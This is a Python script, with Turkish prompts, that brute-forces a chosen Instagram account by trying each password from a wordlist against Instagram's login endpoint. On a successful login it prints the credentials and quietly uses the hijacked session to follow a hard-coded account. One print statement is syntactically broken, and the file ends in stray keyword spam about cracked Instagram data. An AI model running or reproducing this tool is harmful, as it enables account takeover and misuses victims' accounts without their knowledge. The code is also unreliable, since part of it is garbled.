import requests
import json
import time
import os

filename = 'password.txt'
if os.path.isfile(filename):
	with open(filename) as f:
	    passwords = f.read().splitlines()
	    if (len(passwords) > 0):
	    	print ('%Sifreler yüklendi%') len(passwords))
else:
	print ('Lütfen Şifre dosyası oluştur (password.txt)')
	exit()




def userExists(username):
	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
	if (r.status_code == 404):
		print ('User not found')
		return False
	elif (r.status_code == 200):
		followdata = json.loads(r.text)
		fUserID = followdata['user']['id']
		return {'username':username,'id':fUserID}


def Login(username,password):
	sess = requests.Session()
	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
	sess.headers.update({
		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		'x-instagram-ajax':'1',
		'X-Requested-With': 'XMLHttpRequest',
		'origin': 'https://www.instagram.com',
		'ContentType' : 'application/x-www-form-urlencoded',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'Referer': 'https://www.instagram.com',
		'authority': 'www.instagram.com',
		'Host' : 'www.instagram.com',
		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
		'Accept-Encoding' : 'gzip, deflate'
	})

	
	r = sess.get('https://www.instagram.com/') 
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

	data = {'username':username, 'password':password}
	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
	token = r.cookies.get_dict()['csrftoken']
	sess.headers.update({'X-CSRFToken' : token})
	#parse response
	data = json.loads(r.text)
	if (data['status'] == 'fail'):
		print (data['message'])
		return False
	
	if (data['authenticated'] == True):
		return sess 
	else:
		print ('Password incorrect [%s]' % password)
		return False



def follow(sess, username):
	username = userExists(username)
	if (username == False):
		return	
	else:
		userID = username['id']
		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
		print (followReq.text)


username = str(input('Bir Kullanıcı belirt: '))
username = userExists(username)
if (username == False):
	exit()
else:
	username = username['username']



delayLoop = int(input('Kaç sanıyede bir şifre deneneceğini belirt ')) 


for i in range(len(passwords)):
	password = passwords[i]
	sess = Login(username,password)
	if (sess):
		print ('Giriş başarılı %s' % [username,password])

		
		follow(sess,'avr_amit')

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		an = str(input(' çıkmak için y/n  '))
		if (an == 'y'):
			exit()
		else:
			continue

			instagram data_veries 2021 www.instagram.com git clone SakirBey cracked 2019 licenced 
			instagram passwords data_veries import www.instagram.com
			instagram username data_veries import www.instagram.com
			instagram phone data_veries import www.instagram.com
